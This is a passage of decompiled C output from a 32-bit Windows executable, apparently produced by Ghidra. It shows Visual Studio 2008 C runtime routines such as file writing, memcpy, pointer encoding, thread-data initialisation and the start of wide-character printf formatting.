               WideCharToMultiByte(local_1ae8,0,(LPCWSTR)&local_1ac4,1,(LPSTR)&local_10,5,
                                   (LPCSTR)0x0,(LPBOOL)0x0);
          if (nNumberOfBytesToWrite == 0) break;
          BVar7 = WriteFile(*(HANDLE *)(iVar8 + *local_1adc),&local_10,nNumberOfBytesToWrite,
                            (LPDWORD)&local_1ac8,(LPOVERLAPPED)0x0);
          if (BVar7 == 0) goto LAB_0040ceb2;
          local_1acc = (char *)((int)local_1ac0 + local_1ad4);
          if ((int)local_1ac8 < (int)nNumberOfBytesToWrite) break;
          if (local_1ae4 != 0) {
            local_10._0_1_ = '\r';
            BVar7 = WriteFile(*(HANDLE *)(iVar8 + *local_1adc),&local_10,1,(LPDWORD)&local_1ac8,
                              (LPOVERLAPPED)0x0);
            if (BVar7 == 0) goto LAB_0040ceb2;
            if ((int)local_1ac8 < 1) break;
            local_1ad4 = local_1ad4 + 1;
            local_1acc = local_1acc + 1;
          }
        }
        else {
          if ((local_1add == '\x01') || (local_1add == '\x02')) {
            local_1ac4 = (DWORD)(ushort)*pWVar11;
            local_1ae4 = (uint)(*pWVar11 == L'\n');
            pWVar11 = pWVar11 + 1;
            local_1ac0 = local_1ac0 + 1;
          }
          if ((local_1add == '\x01') || (local_1add == '\x02')) {
            wVar2 = __putwch_nolock((wchar_t)local_1ac4);
            if (wVar2 != (wint_t)local_1ac4) goto LAB_0040ceb2;
            local_1acc = local_1acc + 2;
            if (local_1ae4 != 0) {
              local_1ac4 = 0xd;
              wVar2 = __putwch_nolock(L'\r');
              if (wVar2 != (wint_t)local_1ac4) goto LAB_0040ceb2;
              local_1acc = local_1acc + 1;
              local_1ad4 = local_1ad4 + 1;
            }
          }
        }
      } while (local_1ac0 < _MaxCharCount);
      goto LAB_0040cebe;
    }
LAB_0040cec7:
    piVar4 = local_1adc;
    if (local_1ac4 != 0) {
      if (local_1ac4 == 5) {
        piVar4 = __errno();
        *piVar4 = 9;
        puVar3 = ___doserrno();
        *puVar3 = 5;
      }
      else {
        __dosmaperr(local_1ac4);
      }
      goto LAB_0040cf41;
    }
  }
LAB_0040cf03:
  if (((*(byte *)(iVar8 + 4 + *piVar4) & 0x40) == 0) || (*(char *)local_1ad0 != '\x1a')) {
    piVar4 = __errno();
    *piVar4 = 0x1c;
    puVar3 = ___doserrno();
    *puVar3 = 0;
  }
LAB_0040cf41:
  iVar8 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar8;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __write
// 
// Library: Visual Studio 2008 Release

int __cdecl __write(int _FileHandle,void *_Buf,uint _MaxCharCount)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00424fd8)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)((&DAT_00424fe0)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_00424fe0)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_20 = -1;
        }
        else {
          local_20 = __write_nolock(_FileHandle,_Buf,_MaxCharCount);
        }
        FUN_0040d020();
        return local_20;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return -1;
}



void FUN_0040d020(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  _memcpy
// 
// Libraries: Visual Studio 2005 Debug, Visual Studio 2005 Release, Visual Studio 2008 Debug, Visual
// Studio 2008 Release

void * __cdecl _memcpy(void *_Dst,void *_Src,size_t _Size)

{
  undefined4 *puVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  
  if ((_Src < _Dst) && (_Dst < (void *)(_Size + (int)_Src))) {
    puVar1 = (undefined4 *)((_Size - 4) + (int)_Src);
    puVar4 = (undefined4 *)((_Size - 4) + (int)_Dst);
    if (((uint)puVar4 & 3) == 0) {
      uVar2 = _Size >> 2;
      uVar3 = _Size & 3;
      if (7 < uVar2) {
        for (; uVar2 != 0; uVar2 = uVar2 - 1) {
          *puVar4 = *puVar1;
          puVar1 = puVar1 + -1;
          puVar4 = puVar4 + -1;
        }
        switch(uVar3) {
        case 0:
          return _Dst;
        case 2:
          goto switchD_0040d213_caseD_2;
        case 3:
          goto switchD_0040d213_caseD_3;
        }
        goto switchD_0040d213_caseD_1;
      }
    }
    else {
      switch(_Size) {
      case 0:
        goto switchD_0040d213_caseD_0;
      case 1:
        goto switchD_0040d213_caseD_1;
      case 2:
        goto switchD_0040d213_caseD_2;
      case 3:
        goto switchD_0040d213_caseD_3;
      default:
        uVar2 = _Size - ((uint)puVar4 & 3);
        switch((uint)puVar4 & 3) {
        case 1:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          puVar1 = (undefined4 *)((int)puVar1 + -1);
          uVar2 = uVar2 >> 2;
          puVar4 = (undefined4 *)((int)puVar4 - 1);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_0040d213_caseD_2;
            case 3:
              goto switchD_0040d213_caseD_3;
            }
            goto switchD_0040d213_caseD_1;
          }
          break;
        case 2:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          uVar2 = uVar2 >> 2;
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          puVar1 = (undefined4 *)((int)puVar1 + -2);
          puVar4 = (undefined4 *)((int)puVar4 - 2);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_0040d213_caseD_2;
            case 3:
              goto switchD_0040d213_caseD_3;
            }
            goto switchD_0040d213_caseD_1;
          }
          break;
        case 3:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          uVar2 = uVar2 >> 2;
          *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
          puVar1 = (undefined4 *)((int)puVar1 + -3);
          puVar4 = (undefined4 *)((int)puVar4 - 3);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_0040d213_caseD_2;
            case 3:
              goto switchD_0040d213_caseD_3;
            }
            goto switchD_0040d213_caseD_1;
          }
        }
      }
    }
    switch(uVar2) {
    case 7:
      puVar4[7 - uVar2] = puVar1[7 - uVar2];
    case 6:
      puVar4[6 - uVar2] = puVar1[6 - uVar2];
    case 5:
      puVar4[5 - uVar2] = puVar1[5 - uVar2];
    case 4:
      puVar4[4 - uVar2] = puVar1[4 - uVar2];
    case 3:
      puVar4[3 - uVar2] = puVar1[3 - uVar2];
    case 2:
      puVar4[2 - uVar2] = puVar1[2 - uVar2];
    case 1:
      puVar4[1 - uVar2] = puVar1[1 - uVar2];
      puVar1 = puVar1 + -uVar2;
      puVar4 = puVar4 + -uVar2;
    }
    switch(uVar3) {
    case 1:
switchD_0040d213_caseD_1:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      return _Dst;
    case 2:
switchD_0040d213_caseD_2:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
      return _Dst;
    case 3:
switchD_0040d213_caseD_3:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
      *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
      return _Dst;
    }
switchD_0040d213_caseD_0:
    return _Dst;
  }
  if (((0xff < _Size) && (DAT_00424fd4 != 0)) && (((uint)_Dst & 0xf) == ((uint)_Src & 0xf))) {
    puVar1 = __VEC_memcpy((undefined4 *)_Dst,(undefined4 *)_Src,_Size);
    return puVar1;
  }
  puVar1 = (undefined4 *)_Dst;
  if (((uint)_Dst & 3) == 0) {
    uVar2 = _Size >> 2;
    uVar3 = _Size & 3;
    if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
      for (; uVar2 != 0; uVar2 = uVar2 - 1) {
        *puVar1 = *_Src;
        _Src = (undefined4 *)((int)_Src + 4);
        puVar1 = puVar1 + 1;
      }
      switch(uVar3) {
      case 0:
        return _Dst;
      case 2:
        goto switchD_0040d08c_caseD_2;
      case 3:
        goto switchD_0040d08c_caseD_3;
      }
      goto switchD_0040d08c_caseD_1;
    }
  }
  else {
    switch(_Size) {
    case 0:
      goto switchD_0040d08c_caseD_0;
    case 1:
      goto switchD_0040d08c_caseD_1;
    case 2:
      goto switchD_0040d08c_caseD_2;
    case 3:
      goto switchD_0040d08c_caseD_3;
    default:
      uVar2 = (_Size - 4) + ((uint)_Dst & 3);
      switch((uint)_Dst & 3) {
      case 1:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
        uVar2 = uVar2 >> 2;
        *(undefined *)((int)_Dst + 2) = *(undefined *)((int)_Src + 2);
        _Src = (void *)((int)_Src + 3);
        puVar1 = (undefined4 *)((int)_Dst + 3);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_0040d08c_caseD_2;
          case 3:
            goto switchD_0040d08c_caseD_3;
          }
          goto switchD_0040d08c_caseD_1;
        }
        break;
      case 2:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        uVar2 = uVar2 >> 2;
        *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
        _Src = (void *)((int)_Src + 2);
        puVar1 = (undefined4 *)((int)_Dst + 2);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_0040d08c_caseD_2;
          case 3:
            goto switchD_0040d08c_caseD_3;
          }
          goto switchD_0040d08c_caseD_1;
        }
        break;
      case 3:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        _Src = (void *)((int)_Src + 1);
        uVar2 = uVar2 >> 2;
        puVar1 = (undefined4 *)((int)_Dst + 1);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_0040d08c_caseD_2;
          case 3:
            goto switchD_0040d08c_caseD_3;
          }
          goto switchD_0040d08c_caseD_1;
        }
      }
    }
  }
                    // WARNING: Could not find normalized switch variable to match jumptable
  switch(uVar2) {
  case 0x1c:
  case 0x1d:
  case 0x1e:
  case 0x1f:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 7] = *(undefined4 *)((int)_Src + (uVar2 - 7) * 4);
  case 0x18:
  case 0x19:
  case 0x1a:
  case 0x1b:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 6] = *(undefined4 *)((int)_Src + (uVar2 - 6) * 4);
  case 0x14:
  case 0x15:
  case 0x16:
  case 0x17:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 5] = *(undefined4 *)((int)_Src + (uVar2 - 5) * 4);
  case 0x10:
  case 0x11:
  case 0x12:
  case 0x13:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 4] = *(undefined4 *)((int)_Src + (uVar2 - 4) * 4);
  case 0xc:
  case 0xd:
  case 0xe:
  case 0xf:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 3] = *(undefined4 *)((int)_Src + (uVar2 - 3) * 4);
  case 8:
  case 9:
  case 10:
  case 0xb:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 2] = *(undefined4 *)((int)_Src + (uVar2 - 2) * 4);
  case 4:
  case 5:
  case 6:
  case 7:
    puVar1[uVar2 - 1] = *(undefined4 *)((int)_Src + (uVar2 - 1) * 4);
    _Src = (void *)((int)_Src + uVar2 * 4);
    puVar1 = puVar1 + uVar2;
  }
  switch(uVar3) {
  case 1:
switchD_0040d08c_caseD_1:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    return _Dst;
  case 2:
switchD_0040d08c_caseD_2:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)_Src + 1);
    return _Dst;
  case 3:
switchD_0040d08c_caseD_3:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)_Src + 1);
    *(undefined *)((int)puVar1 + 2) = *(undefined *)((int)_Src + 2);
    return _Dst;
  }
switchD_0040d08c_caseD_0:
  return _Dst;
}



// Library Function - Single Match
//  __encode_pointer
// 
// Library: Visual Studio 2008 Release

int __cdecl __encode_pointer(int param_1)

{
  LPVOID pvVar1;
  code *pcVar2;
  int iVar3;
  HMODULE hModule;
  FARPROC pFVar4;
  
  pvVar1 = TlsGetValue(DAT_00422544);
  if ((pvVar1 != (LPVOID)0x0) && (DAT_00422540 != -1)) {
    iVar3 = DAT_00422540;
    pcVar2 = (code *)TlsGetValue(DAT_00422544);
    iVar3 = (*pcVar2)(iVar3);
    if (iVar3 != 0) {
      pFVar4 = *(FARPROC *)(iVar3 + 0x1f8);
      goto LAB_0040d3f5;
    }
  }
  hModule = GetModuleHandleW(u_KERNEL32_DLL_0041c318);
  if ((hModule == (HMODULE)0x0) &&
     (hModule = (HMODULE)__crt_waiting_on_module_handle(u_KERNEL32_DLL_0041c318),
     hModule == (HMODULE)0x0)) {
    return param_1;
  }
  pFVar4 = GetProcAddress(hModule,s_EncodePointer_0041c308);
LAB_0040d3f5:
  if (pFVar4 != (FARPROC)0x0) {
    param_1 = (*pFVar4)(param_1);
  }
  return param_1;
}



// Library Function - Single Match
//  __encoded_null
// 
// Library: Visual Studio 2008 Release

void __encoded_null(void)

{
  __encode_pointer(0);
  return;
}



// Library Function - Single Match
//  __decode_pointer
// 
// Library: Visual Studio 2008 Release

int __cdecl __decode_pointer(int param_1)

{
  LPVOID pvVar1;
  code *pcVar2;
  int iVar3;
  HMODULE hModule;
  FARPROC pFVar4;
  
  pvVar1 = TlsGetValue(DAT_00422544);
  if ((pvVar1 != (LPVOID)0x0) && (DAT_00422540 != -1)) {
    iVar3 = DAT_00422540;
    pcVar2 = (code *)TlsGetValue(DAT_00422544);
    iVar3 = (*pcVar2)(iVar3);
    if (iVar3 != 0) {
      pFVar4 = *(FARPROC *)(iVar3 + 0x1fc);
      goto LAB_0040d470;
    }
  }
  hModule = GetModuleHandleW(u_KERNEL32_DLL_0041c318);
  if ((hModule == (HMODULE)0x0) &&
     (hModule = (HMODULE)__crt_waiting_on_module_handle(u_KERNEL32_DLL_0041c318),
     hModule == (HMODULE)0x0)) {
    return param_1;
  }
  pFVar4 = GetProcAddress(hModule,s_DecodePointer_0041c334);
LAB_0040d470:
  if (pFVar4 != (FARPROC)0x0) {
    param_1 = (*pFVar4)(param_1);
  }
  return param_1;
}



// Library Function - Single Match
//  ___set_flsgetvalue
// 
// Library: Visual Studio 2008 Release

LPVOID ___set_flsgetvalue(void)

{
  LPVOID lpTlsValue;
  
  lpTlsValue = TlsGetValue(DAT_00422544);
  if (lpTlsValue == (LPVOID)0x0) {
    lpTlsValue = (LPVOID)__decode_pointer(DAT_004237b0);
    TlsSetValue(DAT_00422544,lpTlsValue);
  }
  return lpTlsValue;
}



// Library Function - Single Match
//  __mtterm
// 
// Library: Visual Studio 2008 Release

void __cdecl __mtterm(void)

{
  code *pcVar1;
  int iVar2;
  
  if (DAT_00422540 != -1) {
    iVar2 = DAT_00422540;
    pcVar1 = (code *)__decode_pointer(DAT_004237b8);
    (*pcVar1)(iVar2);
    DAT_00422540 = -1;
  }
  if (DAT_00422544 != 0xffffffff) {
    TlsFree(DAT_00422544);
    DAT_00422544 = 0xffffffff;
  }
  __mtdeletelocks();
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __initptd
// 
// Library: Visual Studio 2008 Release

void __cdecl __initptd(_ptiddata _Ptd,pthreadlocinfo _Locale)

{
  HMODULE hModule;
  FARPROC pFVar1;
  
  hModule = GetModuleHandleW(u_KERNEL32_DLL_0041c318);
  if (hModule == (HMODULE)0x0) {
    hModule = (HMODULE)__crt_waiting_on_module_handle(u_KERNEL32_DLL_0041c318);
  }
  _Ptd->_pxcptacttab = &DAT_0041ca30;
  _Ptd->_holdrand = 1;
  if (hModule != (HMODULE)0x0) {
    pFVar1 = GetProcAddress(hModule,s_EncodePointer_0041c308);
    *(FARPROC *)((_Ptd->_setloc_data)._cacheout + 0x1d) = pFVar1;
    pFVar1 = GetProcAddress(hModule,s_DecodePointer_0041c334);
    *(FARPROC *)((_Ptd->_setloc_data)._cacheout + 0x1f) = pFVar1;
  }
  _Ptd->_ownlocale = 1;
  *(undefined *)((_Ptd->_setloc_data)._cachein + 8) = 0x43;
  *(undefined *)((int)(_Ptd->_setloc_data)._cachein + 0x93) = 0x43;
  _Ptd->ptmbcinfo = (pthreadmbcinfo)&DAT_00422750;
  __lock(0xd);
  InterlockedIncrement(&_Ptd->ptmbcinfo->refcount);
  FUN_0040d5d1();
  __lock(0xc);
  _Ptd->ptlocinfo = _Locale;
  if (_Locale == (pthreadlocinfo)0x0) {
    _Ptd->ptlocinfo = (pthreadlocinfo)PTR_DAT_00422d58;
  }
  ___addlocaleref(&_Ptd->ptlocinfo->refcount);
  FUN_0040d5da();
  return;
}



void FUN_0040d5d1(void)

{
  FUN_0040e64c(0xd);
  return;
}



void FUN_0040d5da(void)

{
  FUN_0040e64c(0xc);
  return;
}



// Library Function - Single Match
//  __getptd_noexit
// 
// Library: Visual Studio 2008 Release

_ptiddata __cdecl __getptd_noexit(void)

{
  DWORD dwErrCode;
  code *pcVar1;
  _ptiddata _Ptd;
  int iVar2;
  DWORD DVar3;
  undefined4 uVar4;
  _ptiddata p_Var5;
  
  dwErrCode = GetLastError();
  uVar4 = DAT_00422540;
  pcVar1 = (code *)___set_flsgetvalue();
  _Ptd = (_ptiddata)(*pcVar1)(uVar4);
  if (_Ptd == (_ptiddata)0x0) {
    _Ptd = (_ptiddata)__calloc_crt(1,0x214);
    if (_Ptd != (_ptiddata)0x0) {
      uVar4 = DAT_00422540;
      p_Var5 = _Ptd;
      pcVar1 = (code *)__decode_pointer(DAT_004237b4);
      iVar2 = (*pcVar1)(uVar4,p_Var5);
      if (iVar2 == 0) {
        _free(_Ptd);
        _Ptd = (_ptiddata)0x0;
      }
      else {
        __initptd(_Ptd,(pthreadlocinfo)0x0);
        DVar3 = GetCurrentThreadId();
        _Ptd->_thandle = 0xffffffff;
        _Ptd->_tid = DVar3;
      }
    }
  }
  SetLastError(dwErrCode);
  return _Ptd;
}



// Library Function - Single Match
//  __getptd
// 
// Library: Visual Studio 2008 Release

_ptiddata __cdecl __getptd(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd_noexit();
  if (p_Var1 == (_ptiddata)0x0) {
    __amsg_exit(0x10);
  }
  return p_Var1;
}



void FUN_0040d790(void)

{
  FUN_0040e64c(0xd);
  return;
}



void FUN_0040d79c(void)

{
  FUN_0040e64c(0xc);
  return;
}



// Library Function - Single Match
//  __mtinit
// 
// Library: Visual Studio 2008 Release

int __cdecl __mtinit(void)

{
  HMODULE hModule;
  BOOL BVar1;
  int iVar2;
  code *pcVar3;
  _ptiddata _Ptd;
  DWORD DVar4;
  undefined *puVar5;
  _ptiddata p_Var6;
  
  hModule = GetModuleHandleW(u_KERNEL32_DLL_0041c318);
  if (hModule == (HMODULE)0x0) {
    hModule = (HMODULE)__crt_waiting_on_module_handle(u_KERNEL32_DLL_0041c318);
  }
  if (hModule != (HMODULE)0x0) {
    DAT_004237ac = GetProcAddress(hModule,s_FlsAlloc_0041c364);
    DAT_004237b0 = GetProcAddress(hModule,s_FlsGetValue_0041c358);
    DAT_004237b4 = GetProcAddress(hModule,s_FlsSetValue_0041c34c);
    DAT_004237b8 = GetProcAddress(hModule,s_FlsFree_0041c344);
    if ((((DAT_004237ac == (FARPROC)0x0) || (DAT_004237b0 == (FARPROC)0x0)) ||
        (DAT_004237b4 == (FARPROC)0x0)) || (DAT_004237b8 == (FARPROC)0x0)) {
      DAT_004237b0 = TlsGetValue_exref;
      DAT_004237ac = (FARPROC)&LAB_0040d482;
      DAT_004237b4 = TlsSetValue_exref;
      DAT_004237b8 = TlsFree_exref;
    }
    DAT_00422544 = TlsAlloc();
    if (DAT_00422544 == 0xffffffff) {
      return 0;
    }
    BVar1 = TlsSetValue(DAT_00422544,DAT_004237b0);
    if (BVar1 == 0) {
      return 0;
    }
    __init_pointers();
    DAT_004237ac = (FARPROC)__encode_pointer((int)DAT_004237ac);
    DAT_004237b0 = (FARPROC)__encode_pointer((int)DAT_004237b0);
    DAT_004237b4 = (FARPROC)__encode_pointer((int)DAT_004237b4);
    DAT_004237b8 = (FARPROC)__encode_pointer((int)DAT_004237b8);
    iVar2 = __mtinitlocks();
    if (iVar2 != 0) {
      puVar5 = &LAB_0040d676;
      pcVar3 = (code *)__decode_pointer((int)DAT_004237ac);
      DAT_00422540 = (*pcVar3)(puVar5);
      if ((DAT_00422540 != -1) && (_Ptd = (_ptiddata)__calloc_crt(1,0x214), _Ptd != (_ptiddata)0x0))
      {
        iVar2 = DAT_00422540;
        p_Var6 = _Ptd;
        pcVar3 = (code *)__decode_pointer((int)DAT_004237b4);
        iVar2 = (*pcVar3)(iVar2,p_Var6);
        if (iVar2 != 0) {
          __initptd(_Ptd,(pthreadlocinfo)0x0);
          DVar4 = GetCurrentThreadId();
          _Ptd->_thandle = 0xffffffff;
          _Ptd->_tid = DVar4;
          return 1;
        }
      }
    }
  }
  __mtterm();
  return 0;
}



// Library Function - Single Match
//  _write_char
// 
// Library: Visual Studio 2008 Release

void __cdecl _write_char(wchar_t param_1)

{
  wint_t wVar1;
  FILE *in_EAX;
  int *unaff_ESI;
  
  if (((*(byte *)&in_EAX->_flag & 0x40) == 0) || (in_EAX->_base != (char *)0x0)) {
    wVar1 = __fputwc_nolock(param_1,in_EAX);
    if (wVar1 == 0xffff) {
      *unaff_ESI = -1;
      return;
    }
  }
  *unaff_ESI = *unaff_ESI + 1;
  return;
}



// Library Function - Single Match
//  _write_multi_char
// 
// Library: Visual Studio 2008 Release

void __cdecl _write_multi_char(wchar_t param_1,int param_2)

{
  int *in_EAX;
  
  do {
    if (param_2 < 1) {
      return;
    }
    param_2 = param_2 + -1;
    _write_char(param_1);
  } while (*in_EAX != -1);
  return;
}



// Library Function - Single Match
//  _write_string
// 
// Library: Visual Studio 2008 Release

void __thiscall _write_string(void *this,int param_1)

{
  int *in_EAX;
  int *piVar1;
  int unaff_EDI;
  
  if (((*(byte *)(unaff_EDI + 0xc) & 0x40) == 0) || (*(int *)(unaff_EDI + 8) != 0)) {
    while (0 < param_1) {
                    // WARNING: Load size is inaccurate
      param_1 = param_1 + -1;
      _write_char(*this);
      this = (void *)((int)this + 2);
      if (*in_EAX == -1) {
        piVar1 = __errno();
        if (*piVar1 != 0x2a) {
          return;
        }
        _write_char(L'?');
      }
    }
  }
  else {
    *in_EAX = *in_EAX + param_1;
  }
  return;
}



// WARNING: Type propagation algorithm not settling
// Library Function - Single Match
//  __woutput_s_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __woutput_s_l(FILE *_File,wchar_t *_Format,_locale_t _Locale,va_list _ArgList)

{
  wchar_t wVar1;
  wchar_t wVar2;
  int *piVar3;
  uint uVar4;
  code *pcVar5;
  int iVar6;
  int extraout_ECX;
  byte *pbVar7;
  int **ppiVar8;
  int *piVar9;
  byte *pbVar10;
  wchar_t *pwVar11;
  bool bVar12;
  longlong lVar13;
  undefined8 uVar14;
  undefined4 uVar15;
  localeinfo_struct *plVar16;
  int *local_470;
  int *local_46c;
  uint local_468;
  wchar_t *local_464;
  undefined4 local_460;
  int *local_45c;
  int local_458;
  int local_454;
  localeinfo_struct local_450;
  int local_448;
  char local_444;
  FILE *local_440;
  char local_43c;
  undefined local_43b;
  uint local_438;
  undefined2 local_434;
  short local_432;
  int *local_430;
  int local_42c;
  int local_428;
  int local_424;
  byte *local_420;
  int **local_41c;
  byte *local_418;
  int *local_414;
  int *local_410;
  uint local_40c;
  int local_408 [127];
  undefined4 local_209;
  uint local_8;
  
  local_8 = DAT_00422040 ^ (uint)&stack0xfffffffc;
  local_440 = _File;
  local_41c = (int **)_ArgList;
  local_458 = 0;
  local_40c = 0;
  local_430 = (int *)0x0;
  local_410 = (int *)0x0;
  local_428 = 0;
  local_454 = 0;
  local_42c = 0;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_450,_Locale);
  if (_File == (FILE *)0x0) {
switchD_0040db1b_caseD_9:
    piVar3 = __errno();
    *piVar3 = 0x16;
  }
  else {
    if (_Format != (wchar_t *)0x0) {
      local_420 = (byte *)(uint)(ushort)*_Format;
      local_424 = 0;
      local_418 = (byte *)0x0;
      local_438 = 0;
      local_45c = (int *)0x0;
      if (*_Format != L'\0') {
        do {
          pwVar11 = _Format + 1;
          local_464 = pwVar11;
          if (local_424 < 0) break;
          wVar2 = (wchar_t)local_420;
          if ((ushort)(wVar2 + L'￠') < 0x59) {
            uVar4 = local_420[0x41cb00] & 0xf;
          }
          else {
            uVar4 = 0;
          }
          local_438 = (uint)((byte)(&DAT_0041cb20)[local_438 + uVar4 * 9] >> 4);
          ppiVar8 = local_41c;
          switch(local_438) {
          case 0:
switchD_0040db1b_caseD_0:
            local_42c = 1;
            _write_char(wVar2);
            ppiVar8 = (int **)_ArgList;
            break;
          case 1:
            local_410 = (int *)0xffffffff;
            local_460 = 0;
            local_454 = 0;
            local_430 = (int *)0x0;
            local_428 = 0;
            local_40c = 0;
            local_42c = 0;
            ppiVar8 = (int **)_ArgList;
            break;
          case 2:
            if (local_420 == (byte *)0x20) {
              local_40c = local_40c | 2;
              ppiVar8 = (int **)_ArgList;
            }
            else if (local_420 == (byte *)0x23) {
              local_40c = local_40c | 0x80;
              ppiVar8 = (int **)_ArgList;
            }
            else if (local_420 == (byte *)0x2b) {
              local_40c = local_40c | 1;
              ppiVar8 = (int **)_ArgList;
            }
            else if (local_420 == (byte *)0x2d) {
              local_40c = local_40c | 4;
              ppiVar8 = (int **)_ArgList;
            }
            else if (local_420 == (byte *)0x30) {
              local_40c = local_40c | 8;
              ppiVar8 = (int **)_ArgList;
            }
            break;
          case 3:
            if (wVar2 == L'*') {
              local_430 = *(int **)_ArgList;
              local_41c = (int **)((int)_ArgList + 4);
              ppiVar8 = local_41c;
              if ((int)local_430 < 0) {
                local_40c = local_40c | 4;
                local_430 = (int *)-(int)local_430;
              }
            }
            else {
              local_430 = (int *)(local_420 + (int)local_430 * 10 + -0x30);
              ppiVar8 = (int **)_ArgList;
            }
            break;
          case 4:
            local_410 = (int *)0x0;
            ppiVar8 = (int **)_ArgList;
            break;
          case 5:
            if (wVar2 == L'*') {
              local_410 = *(int **)_ArgList;
              local_41c = (int **)((int)_ArgList + 4);
              ppiVar8 = local_41c;
              if ((int)local_410 < 0) {
                local_410 = (int *)0xffffffff;
              }
            }
            else {
              local_410 = (int *)(local_420 + (int)local_410 * 10 + -0x30);
              ppiVar8 = (int **)_ArgList;
            }
            break;
          case 6:
            if (local_420 == (byte *)0x49) {
              wVar1 = *pwVar11;
              if ((wVar1 == L'6') && (_Format[2] == L'4')) {
                local_40c = local_40c | 0x8000;
                ppiVar8 = (int **)_ArgList;
                pwVar11 = _Format + 3;
              }
              else if ((wVar1 == L'3') && (_Format[2] == L'2')) {
                local_40c = local_40c & 0xffff7fff;
